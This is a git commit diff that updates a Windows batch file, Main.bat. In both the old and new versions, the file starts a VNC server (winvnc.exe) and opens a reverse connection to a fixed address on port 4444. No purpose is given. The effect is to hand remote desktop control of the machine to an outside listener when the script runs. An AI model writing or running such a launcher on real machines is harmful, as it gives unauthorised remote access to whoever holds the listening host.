1616d16d1682920f0410371a03817eafd5882315
TriPaGonski <122581754+TriPaGonski@users.noreply.github.com>
2024-06-03 00:25:10 +0200

    Update Main.bat

--- Main.bat
+++ Main.bat
@@ -1,7 +1,4 @@
-@echo off
-echo Current directory contents:
-dir
-timeout /t 3 >nul
-start "" "%~dp0winvnc.exe" -run
-timeout /t 3 >nul
-start "" "%~dp0winvnc.exe" -connect 192.168.68.50::4444
+@echo
+start winvnc.exe -run
+timeout /t 1 >nul
+start winvnc.exe -connect 192.168.68.50::4444
